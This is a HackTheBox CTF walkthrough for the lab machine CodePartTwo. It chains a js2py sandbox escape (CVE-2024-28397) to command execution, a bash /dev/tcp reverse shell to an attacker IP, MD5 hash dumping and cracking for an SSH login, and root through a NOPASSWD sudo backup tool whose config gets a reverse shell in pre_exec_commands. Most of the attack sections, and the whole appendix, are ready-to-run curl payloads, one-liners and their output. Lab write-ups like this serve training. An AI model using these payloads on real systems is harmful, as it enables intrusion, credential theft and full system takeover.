# HackTheBox - CodePartTwo: Comprehensive Walkthrough

> **Target IP:** 10.129.232.59  
> **Attacker IP:** 10.10.16.84  
> **Difficulty:** Easy  
> **Category:** Linux / Web Application / Sandbox Escape  

---

## Table of Contents

1. [Mindset & Approach](#1-mindset--approach)
2. [Initial Reconnaissance](#2-initial-reconnaissance)
3. [Web Application Enumeration](#3-web-application-enumeration)
4. [Vulnerability Analysis: CVE-2024-28397](#4-vulnerability-analysis-cve-2024-28397)
5. [Initial Foothold: From JS to Shell](#5-initial-foothold-from-js-to-shell)
6. [User Pivot: Credential Harvesting](#6-user-pivot-credential-harvesting)
7. [Privilege Escalation: Abusing npbackup-cli](#7-privilege-escalation-abusing-npbackup-cli)
8. [Flags & Completion](#8-flags--completion)
9. [Key Lessons & Takeaways](#9-key-lessons--takeaways)

---

## 1. Mindset & Approach

**The Hacker Mindset:** When approaching any machine, we must think like an attacker following the **Cyber Kill Chain**:

1. **Reconnaissance** - What can we see from the outside?
2. **Weaponization** - What vulnerabilities match the exposed services?
3. **Delivery** - How do we get our exploit to the target?
4. **Exploitation** - How do we gain initial access?
5. **Installation** - How do we maintain persistence or stability?
6. **Command & Control** - How do we interact with the compromised system?
7. **Actions on Objectives** - How do we escalate privileges and achieve our goal?

**Why this matters:** CodePartTwo teaches a critical lesson: **sandboxing is hard**. The application uses `js2py.disable_pyimport()` to prevent Python imports from JavaScript, yet the sandbox is still escapable. This is a classic example of **security through obscurity failing** — just because you disabled one feature doesn't mean you've closed all attack paths.

**Our Strategy:**
- Start broad (port scan), then narrow down (web app analysis)
- Follow the "download source code" breadcrumb
- Understand the technology stack (Flask + js2py)
- Research known vulnerabilities in the stack
- Chain low-privilege access to credential exposure to privilege escalation

---

## 2. Initial Reconnaissance

### 2.1 Why Port Scan First?

Before touching any application, we need to understand the **attack surface**. A machine can only be compromised through exposed services. Port scanning tells us:
- What services are running
- What versions are installed (for CVE matching)
- What the operating system likely is
- Which ports are worth investigating further

### 2.2 The Command

```bash
nmap -p- --min-rate 2000 -sC -sV 10.129.232.59
```

**Breaking it down:**
- `-p-` → Scan all 65,535 TCP ports. We don't want to miss anything.
- `--min-rate 2000` → Send at least 2,000 packets per second. Speeds up the scan.
- `-sC` → Run default NSE scripts. These grab banners, check for common misconfigurations, and provide useful metadata.
- `-sV` → Version detection. Knowing the exact version of a service helps us find known exploits.

**The Hacker Mindset:** *"Why guess when you can know?"* Version detection is the difference between blindly throwing exploits and surgically selecting the right one.

### 2.3 Results Analysis

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
8000/tcp open  http    Gunicorn 20.0.4
```

**What this tells us:**
- **Port 22 (SSH):** Standard Ubuntu SSH. Not likely vulnerable to easy exploits, but we'll keep credentials in mind for later.
- **Port 8000 (Gunicorn):** This is a Python WSGI HTTP server. Almost certainly a Flask or Django application. The version `20.0.4` is old but not directly exploitable — the *application logic* is what matters here.
- **OS:** Ubuntu Linux (confirmed by OpenSSH banner and CPE)

**Decision Point:** We have a web app on port 8000. This is our primary target. SSH is secondary — we'll only use it once we have credentials.

**The Hacker Mindset:** *"Always enumerate before you exploit."* A web app on a non-standard port (not 80/443) often means the developer didn't harden it as much as a production-facing application.

---

## 3. Web Application Enumeration

### 3.1 Why Register for an Account?

Many web applications expose different functionality to authenticated users versus anonymous visitors. By creating an account, we can:
- Access restricted pages (dashboards, admin panels)
- Discover additional API endpoints
- Test for broken access controls
- Find features that process user input (potential injection points)

### 3.2 Directory Discovery

Before registering, let's see what pages exist:

```bash
dirsearch -u "http://10.129.232.59:8000"
```

**Results:**
- `/dashboard` → Redirects to `/login` (requires authentication)
- `/download` → Source code download!
- `/login` → Login page
- `/logout` → Logout endpoint
- `/register` → Registration page

**The Hacker Mindset:** *"The `/download` endpoint is a goldmine."* Getting the source code means we can perform **white-box testing** — analyzing the application logic for vulnerabilities instead of blindly guessing.

### 3.3 Registration & Login

```bash
# Register an account
curl -s -X POST http://10.129.232.59:8000/register -d "username=test&password=test"

# Login and save session cookie
curl -s -X POST http://10.129.232.59:8000/login -d "username=test&password=test" -c cookies.txt
```

**Why curl instead of a browser?**
- Faster, scriptable, and reproducible
- Easy to save session cookies for subsequent requests
- Perfect for API testing

**The Hacker Mindset:** *"Automation is key."* If you find yourself repeating the same clicks in a browser, you're wasting time. Script everything you can.

### 3.4 Source Code Analysis

Downloading the source code reveals a Flask application with these key components:

```python
js2py.disable_pyimport()
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'

@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})
```

**Critical Observations:**
1. **`js2py.disable_pyimport()`** — The developer *tried* to sandbox the JS execution by disabling Python imports. This is a red flag: it means they knew execution was dangerous but implemented an incomplete fix.
2. **`sqlite:///users.db`** — A local SQLite database. If we can read the filesystem, we might extract credentials.
3. **`/run_code`** — Accepts arbitrary JavaScript and evaluates it. This is our injection point.
4. **Password hashing uses MD5** — Fast to crack with rainbow tables or hash databases.

**The Hacker Mindset:** *"When a developer explicitly disables a 'dangerous' feature, ask yourself: what other dangerous features did they forget about?"* `disable_pyimport()` doesn't stop Python object introspection.

---

## 4. Vulnerability Analysis: CVE-2024-28397

### 4.1 What is js2py?

`js2py` is a Python library that translates JavaScript code into Python and executes it. The library exposes Python objects to JavaScript, which means JavaScript code can access Python's internal machinery.

### 4.2 The Sandbox Escape

Even with `js2py.disable_pyimport()`, JavaScript code can still:
1. Get a Python-backed object: `Object.getOwnPropertyNames({})` returns a `dict_keys` object
2. Access Python's attribute system via `.__getattribute__`
3. Climb the class hierarchy: `.__class__.__base__` reaches Python's base `object`
4. Enumerate all loaded classes: `object.__subclasses__()`
5. Find `subprocess.Popen` and execute arbitrary commands

**Why this works:**
Js2Py translates JS objects into Python wrappers. These wrappers retain Python's introspection capabilities. The developer only blocked `pyimport()` (importing modules), but didn't prevent access to already-loaded classes like `subprocess.Popen`.

**The Hacker Mindset:** *"Sandbox escapes are about finding the path of least resistance."* If the front door is locked, check the windows, the basement, and the chimney.

### 4.3 Payload Breakdown

```javascript
(function(){
    // Step 1: Get a Python object wrapper
    var o = Object.getOwnPropertyNames({}).__getattribute__.__class__.__base__;
    
    // Step 2: Get all subclasses of Python's base object
    var s = o.__subclasses__();
    
    // Step 3: Find subprocess.Popen
    var p;
    for(var i=0; i<s.length; i++){
        if(s[i].__module__ == 'subprocess' && s[i].__name__ == 'Popen'){
            p = s[i];
            break;
        }
    }
    
    // Step 4: Execute command and return output
    return p ? p('whoami', -1, null, -1, -1, -1, null, null, true).communicate()[0].decode('utf-8') : 'Not Found';
})()
```

**Understanding the Popen arguments:**
- `'whoami'` → The command to execute
- `-1` → `bufsize=-1` (default)
- `null` → `executable=None`
- `-1, -1, -1` → `stdin=-1, stdout=-1, stderr=-1` (pipe streams)
- `null, null` → `preexec_fn=None, close_fds=-1`
- `true` → **`shell=True`** — This is critical! It means the command string is passed to `/bin/sh -c`, allowing shell syntax.

**The Hacker Mindset:** *"Understand every argument."* Blind copy-pasting gets you nowhere when things break. Knowing that `true` enables `shell=True` tells us we can use shell metacharacters, pipes, and redirections.

---

## 5. Initial Foothold: From JS to Shell

### 5.1 Testing RCE (Proof of Concept)

Before firing a reverse shell, we must confirm the exploit works. This is **operational security**: don't expose your infrastructure (listeners, payloads) until you know the target is vulnerable.

```bash
curl -s -X POST http://10.129.232.59:8000/run_code \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"code":"(function(){ var o = Object.getOwnPropertyNames({}).__getattribute__.__class__.__base__; var s = o.__subclasses__(); var p; for(var i=0; i<s.length; i++){ if(s[i].__module__ == '\''subprocess'\'' && s[i].__name__ == '\''Popen'\''){ p = s[i]; break; } } return p ? p('\''whoami'\'', -1, null, -1, -1, -1, null, null, true).communicate()[0].decode('\''utf-8'\'') : '\''Not Found'\''; })()"}'
```

**Response:** `{"result":"app\n"}`

**Analysis:**
- The application runs as user `app` (not `www-data` as we might expect)
- RCE is confirmed
- We have arbitrary command execution

**The Hacker Mindset:** *"Start small, then scale."* A `whoami` test is quiet, fast, and tells you exactly what context you're operating in.

### 5.2 Reverse Shell Payload

Now we replace `whoami` with a bash reverse shell:

```bash
bash -c "bash -i >& /dev/tcp/10.10.16.84/4444 0>&1"
```

**How the reverse shell works:**
- `bash -c` → Execute the following string in a new bash instance
- `bash -i` → Interactive bash shell
- `>& /dev/tcp/10.10.16.84/4444` → Redirect stdout and stderr to a TCP socket
- `0>&1` → Redirect stdin to the same socket (completing the bidirectional pipe)

**Why `/dev/tcp`?**
This is a bash built-in feature (not a real filesystem path) that creates TCP connections. It's incredibly useful for reverse shells because it requires no external tools like `nc`.

**The full exploit request:**

```bash
# Terminal 1: Start listener
nc -lvnp 4444

# Terminal 2: Send payload
curl -s -X POST http://10.129.232.59:8000/run_code \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"code":"(function(){ var o = Object.getOwnPropertyNames({}).__getattribute__.__class__.__base__; var s = o.__subclasses__(); var p; for(var i=0; i<s.length; i++){ if(s[i].__module__ == '\''subprocess'\'' && s[i].__name__ == '\''Popen'\''){ p = s[i]; break; } } return p ? p('\''bash -c "bash -i >\\& /dev/tcp/10.10.16.84/4444 0>\\&1"'\'', -1, null, -1, -1, -1, null, null, true).communicate()[0].decode('\''utf-8'\'') : '\''Not Found'\''; })()"}'
```

**Note:** The curl command will **hang** because `communicate()` waits for the subprocess to finish. The subprocess won't finish until you close the reverse shell. This is normal.

**The Hacker Mindset:** *"Your exploit is a transaction."* The HTTP request hangs, but that's okay — the shell has already been spawned on the other side. Don't panic when your terminal freezes; check your listener.

### 5.3 Stabilizing the Shell

Once connected, we have a basic bash shell:

```bash
$ id
uid=1001(app) gid=1001(app) groups=1001(app)
```

**Why stabilize?**
- Basic reverse shells don't handle Ctrl+C, Ctrl+Z, or terminal resizing
- A stable shell lets you run interactive commands (vim, sudo, etc.)

**Basic stabilization:**
```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
# Press Ctrl+Z to background
# On Kali:
stty raw -echo; fg
# Press Enter twice
# In the shell:
export TERM=xterm
```

**The Hacker Mindset:** *"A shell is just the beginning."* Getting access is 10% of the work; making it usable is the other 90%.

---

## 6. User Pivot: Credential Harvesting

### 6.1 Why Look for Databases?

The source code revealed `sqlite:///users.db`. SQLite databases are just files on disk. If the application can read them, and we're running as the application user, we can read them too.

**The Hacker Mindset:** *"Trust the source code."* Developers often leave breadcrumbs (hardcoded paths, comments, debug info) that reveal where sensitive data lives.

### 6.2 Extracting the Database

```bash
cd /home/app/app/instance
ls -la
sqlite3 users.db ".tables"
sqlite3 users.db "SELECT * FROM user;"
```

**Results:**
```
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
3|test|098f6bcd4621d373cade4e832627b4f6
```

**Analysis:**
- User `marco` has an MD5 password hash
- MD5 is cryptographically broken and fast to crack
- The hash `649c9d65a206a75f5abe509fe128bce5` is easily crackable

### 6.3 Cracking the Hash

**Method 1: Online databases (fastest for CTFs)**
- CrackStation, Hashes.org, or similar
- Input: `649c9d65a206a75f5abe509fe128bce5`
- Output: `sweetangelbabylove`

**Method 2: Hashcat (offline)**
```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Why MD5 is bad for passwords:**
- No salt → Rainbow tables work instantly
- Fast computation → Billions of guesses per second on GPUs
- Collisions possible (though not relevant here)

**The Hacker Mindset:** *"Passwords are just secrets waiting to be told."* Never assume a hash protects a credential. Always try to crack it.

### 6.4 SSH as Marco

Now we pivot to a stable, interactive shell via SSH:

```bash
ssh marco@10.129.232.59
# Password: sweetangelbabylove
```

**Why SSH instead of staying in the reverse shell?**
- Full TTY with proper terminal handling
- Persistent session (won't die if the web app restarts)
- Easier to run sudo, vim, and other interactive tools
- Less noisy (no constant HTTP requests)

**The Hacker Mindset:** *"Upgrade your access whenever possible."* A reverse shell through a web app is fragile. SSH is robust, quiet, and professional.

---

## 7. Privilege Escalation: Abusing npbackup-cli

### 7.1 Sudo Enumeration

The first thing you do on any new account is check what you can run as root:

```bash
sudo -l
```

**Output:**
```
User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

**Why is this dangerous?**
- `NOPASSWD` means no authentication required
- `/usr/local/bin/npbackup-cli` is a third-party backup tool
- Third-party tools often have configuration files that execute arbitrary commands
- Backup tools especially need to run pre- and post-scripts (e.g., stop databases before backup)

**The Hacker Mindset:** *"Sudo is a treasure map."* Every NOPASSWD entry is a potential root vector. Your job is to figure out how to weaponize it.

### 7.2 Understanding npbackup-cli

`npbackup-cli` is a backup tool built on top of `restic`. Like many backup tools, it supports running commands before and after backups via configuration options:
- `pre_exec_commands` → Commands run **before** the backup
- `post_exec_commands` → Commands run **after** the backup

Since `npbackup-cli` runs as root (via sudo), any command in these arrays executes as **root**.

### 7.3 The Original Config File

```bash
cat /home/marco/npbackup.conf
```

The config is owned by root but readable by marco. It contains:
```yaml
groups:
  default_group:
    backup_opts:
      pre_exec_commands: []
      post_exec_commands: []
```

**The Hacker Mindset:** *"Configuration files are instruction manuals for exploitation."* A config file tells you exactly how a tool behaves and where you can inject malicious behavior.

### 7.4 Modifying the Config

We can't edit the root-owned original, but we can **copy** it and modify our copy:

```bash
cp /home/marco/npbackup.conf /tmp/my_backup.conf
```

Then edit `/tmp/my_backup.conf` to inject our reverse shell into `pre_exec_commands`:

```yaml
groups:
  default_group:
    backup_opts:
      pre_exec_commands: ["bash -c 'bash -i >& /dev/tcp/10.10.16.84/4445 0>&1'"]
```

**Why `pre_exec_commands`?**
- It runs **before** the backup starts
- Even if the backup fails (e.g., file size too small), the pre-exec commands have already run
- Root privileges are already active when pre-exec runs

**The Python script to modify the config:**
```python
with open('/tmp/my_backup.conf', 'r') as f:
    lines = f.readlines()

with open('/tmp/my_backup.conf', 'w') as f:
    for line in lines:
        if 'pre_exec_commands: []' in line:
            f.write('      pre_exec_commands: ["bash -c \'bash -i >& /dev/tcp/10.10.16.84/4445 0>&1\'"]
')
        else:
            f.write(line)
```

### 7.5 The Config Deletion Problem

During our exploitation, we discovered that `npbackup-cli` (or a related process) was deleting modified config files in `/home/marco/`. This is likely a security feature or cleanup mechanism.

**How we solved it:**
- Move the config to `/tmp/` (less likely to be monitored)
- Create and execute in a single command chain to minimize the time window for deletion

**The Hacker Mindset:** *"When the target fights back, adapt."* If a file gets deleted, don't give up — change your timing, location, or method.

### 7.6 One-Liner Exploit

```bash
cp /home/marco/npbackup.conf /tmp/my_backup.conf && python3 -c "
with open('/tmp/my_backup.conf', 'r') as f:
    lines = f.readlines()
with open('/tmp/my_backup.conf', 'w') as f:
    for line in lines:
        if 'pre_exec_commands: []' in line:
            f.write('      pre_exec_commands: [\"bash -c \'bash -i >& /dev/tcp/10.10.16.84/4445 0>&1\'\"]\n')
        else:
            f.write(line)
" && sudo npbackup-cli -c /tmp/my_backup.conf -b
```

**Execution flow:**
1. Copy config to `/tmp`
2. Inject reverse shell into `pre_exec_commands`
3. Run `npbackup-cli` with our custom config
4. Pre-exec fires as root → reverse shell connects back

**On Kali (Terminal 1):**
```bash
nc -lvnp 4445
```

**Result:**
```
connect to [10.10.16.84] from (UNKNOWN) [10.129.232.59] 44496
root@codeparttwo:/home/marco# id
uid=0(root) gid=0(root) groups=0(root)
```

**The Hacker Mindset:** *"Sudo privileges on a complex tool are almost always exploitable."* Backup software, monitoring agents, and deployment tools are designed to run powerful commands. If you control their configuration, you control the system.

---

## 8. Flags & Completion

### User Flag
```bash
cat /home/marco/user.txt
```
**Flag:** `c7e17a9[redacted]6850a69fd`

### Root Flag
```bash
cat /root/root.txt
```
**Flag:** `2b9b783[redacted]85cc240a2`

---

## 9. Key Lessons & Takeaways

### 9.1 Technical Lessons

1. **Sandbox escapes require creativity:** Disabling `pyimport()` doesn't stop object introspection. Any bridge between languages (JS↔Python, Lua↔C, etc.) introduces escape opportunities.

2. **MD5 has no place in password storage:** Always use slow, salted hashes like bcrypt, scrypt, or Argon2.

3. **NOPASSWD sudo on complex tools is dangerous:** Backup tools, package managers, and container runtimes often execute configurable pre/post scripts. Audit these carefully.

4. **Source code is the ultimate enumeration:** The `/download` endpoint gave us everything we needed. Never skip source code review when available.

### 9.2 Methodological Lessons

1. **Follow the breadcrumbs:** Download endpoint → source code → js2py → CVE research → exploit.
2. **Chain your exploits:** RCE as `app` → credential exposure → SSH as `marco` → sudo abuse → root.
3. **Adapt to obstacles:** When the config file kept getting deleted, we moved to `/tmp` and chained commands.
4. **Test before you fire:** The `whoami` test saved us from launching a reverse shell blindly.

### 9.3 The Hacker Mindset in One Sentence

> *"Every restriction is a hint about where to look, every error message is a leak, and every 'disabled' feature is a challenge."*

---

## Appendix: Full Command Reference

```bash
# === RECON ===
nmap -p- --min-rate 2000 -sC -sV 10.129.232.59

# === WEB ENUM ===
dirsearch -u "http://10.129.232.59:8000"
curl -s -X POST http://10.129.232.59:8000/register -d "username=test&password=test"
curl -s -X POST http://10.129.232.59:8000/login -d "username=test&password=test" -c cookies.txt

# === RCE TEST ===
curl -s -X POST http://10.129.232.59:8000/run_code \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"code":"(function(){ var o = Object.getOwnPropertyNames({}).__getattribute__.__class__.__base__; var s = o.__subclasses__(); var p; for(var i=0; i<s.length; i++){ if(s[i].__module__ == '\''subprocess'\'' && s[i].__name__ == '\''Popen'\''){ p = s[i]; break; } } return p ? p('\''whoami'\'', -1, null, -1, -1, -1, null, null, true).communicate()[0].decode('\''utf-8'\'') : '\''Not Found'\''; })()"}'

# === REVERSE SHELL (Terminal 1: nc -lvnp 4444) ===
curl -s -X POST http://10.129.232.59:8000/run_code \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"code":"(function(){ var o = Object.getOwnPropertyNames({}).__getattribute__.__class__.__base__; var s = o.__subclasses__(); var p; for(var i=0; i<s.length; i++){ if(s[i].__module__ == '\''subprocess'\'' && s[i].__name__ == '\''Popen'\''){ p = s[i]; break; } } return p ? p('\''bash -c \"bash -i >\\& /dev/tcp/10.10.16.84/4444 0>\\&1\"'\'', -1, null, -1, -1, -1, null, null, true).communicate()[0].decode('\''utf-8'\'') : '\''Not Found'\''; })()"}'

# === CREDENTIAL HARVESTING ===
cd /home/app/app/instance
sqlite3 users.db "SELECT * FROM user;"
# Crack MD5: 649c9d65a206a75f5abe509fe128bce5 -> sweetangelbabylove

# === SSH PIVOT ===
ssh marco@10.129.232.59

# === PRIVESC ===
sudo -l
cp /home/marco/npbackup.conf /tmp/my_backup.conf && python3 -c "
with open('/tmp/my_backup.conf', 'r') as f:
    lines = f.readlines()
with open('/tmp/my_backup.conf', 'w') as f:
    for line in lines:
        if 'pre_exec_commands: []' in line:
            f.write('      pre_exec_commands: [\"bash -c \'bash -i >& /dev/tcp/10.10.16.84/4445 0>&1\'\"]\n')
        else:
            f.write(line)
" && sudo npbackup-cli -c /tmp/my_backup.conf -b

# === FLAGS ===
cat /home/marco/user.txt
cat /root/root.txt
```

---

*Happy Hacking! *
